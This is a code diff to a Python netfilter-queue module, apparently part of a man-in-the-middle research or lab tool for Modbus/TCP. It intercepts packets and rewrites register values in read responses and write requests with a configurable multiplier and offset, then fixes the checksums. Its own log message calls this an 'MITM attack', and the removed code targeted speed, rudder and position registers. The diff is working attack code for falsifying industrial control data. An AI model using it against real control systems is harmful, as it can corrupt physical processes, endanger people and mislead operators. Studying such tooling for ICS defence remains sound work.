@@ -3,15 +3,16 @@ NFQ module. Callbacks and persistent object
 '''
 
 from scapy.all import IP, TCP, Packet, Ether, IPv6
-from scapy.contrib.modbus import ModbusADURequest, ModbusADUResponse
-from ..mod_table import ModTable
+from scapy.contrib.modbus import *
 from ..buffer import Buffer
+from ..buffer.meta_packet import MetaPacket
 
 class NetFilterQueueBaseClass:
 
-    def __init__(self, buffer: Buffer, mod_table: ModTable):
+    def __init__(self, buffer: Buffer, context):
         self.buffer = buffer
-        self.table = mod_table
+        self.context = context
+        self.slot_name = "modbus_variables"
 
         self.running = False
         self.stop_event = None
@@ -32,58 +33,38 @@ class NetFilterQueueBaseClass:
             self.buffer.put("nfq", "Stopped MITM attack")
             self.running = False
 
-    def modify_spkt(self, spkt: Packet) -> tuple[Packet, bool]:
-        '''
-        Returns a packet, modified according to the mod table
-        '''
+    def modify_mpkt(self, mpkt: MetaPacket) -> tuple[Packet, bool]:
         modified_flag = False
-        if spkt.haslayer("Read Holding Registers Response"):
-            mult = self.table.get_raw("speed", "mult")
-            offset = self.table.get_raw("speed", "offset")
+        if not mpkt.is_modbus or len(mpkt.variables) < 1:
+            return mpkt.pkt, modified_flag
 
-            mbl = spkt.getlayer(ModbusADUResponse)
+        slots = self.context.states[self.slot_name]
+        for i, variable in enumerate(mpkt.variables):
+            slot = slots[variable]
+            mult = float(slot["multiplier"])
+            offs = float(slot["offset"])
+            if mult == 1.0 and offs == 0.0:
+                continue
 
-            speed = mbl.payload.registerVal[0]
-            val = int(speed * mult + offset)
-            val = max(0, min(65535, val))
-            mbl.payload.registerVal[0] = val
-
-            if len(mbl.payload.registerVal) > 1:
-                mult = self.table.get_raw("rudder", "mult")
-                offset = self.table.get_raw("rudder", "offset")
-                rudder = mbl.payload.registerVal[1]
-                val = int(rudder * mult + offset)
+            if m := mpkt.pkt.getlayer(ModbusPDU03ReadHoldingRegistersResponse):
+                val = m.registerVal[i]
+                val = int(val * mult + offs)
                 val = max(0, min(65535, val))
-                mbl.payload.registerVal[1] = val
+                m.registerVal[i] = val
+                modified_flag = True
 
-            modified_flag = True
+            elif m := mpkt.pkt.getlayer(ModbusPDU06WriteSingleRegisterRequest):
+                address = m.registerAddr
+                val = m.registerValue
+                val = int(val * mult + offs)
+                val = max(0, min(65535, val))
+                m.registerValue = val
+                modified_flag = True
 
-        elif spkt.haslayer("Write Single Register"):
-
-            mbl = spkt.getlayer(ModbusADURequest)
-
-            if mbl.payload.registerAddr == 10: # X address
-                var = "x"
-            elif mbl.payload.registerAddr == 11: # Y address
-                var = "y"
-            else: # Theta address
-                var = "theta"
-
-            z = mbl.payload.registerValue
-            mult = self.table.get_raw(var, "mult")
-            offset = self.table.get_raw(var, "offset")
-            val = int(z * mult + offset)
-            val = max(0, min(65535, val))
-            mbl.payload.registerValue = val
-
-            modified_flag = True
-
-        # Recalculate checksums if modified
         if modified_flag:
-            # del mbl.len
-            del spkt[IP].len
-            del spkt[TCP].chksum
-            del spkt[IP].chksum
+            del mpkt.pkt[IP].len
+            del mpkt.pkt[TCP].chksum
+            del mpkt.pkt[IP].chksum
 
-            spkt = IP(bytes(spkt))
-        return spkt, modified_flag
+            mpkt.pkt = IP(bytes(mpkt.pkt))
+        return mpkt.pkt, modified_flag
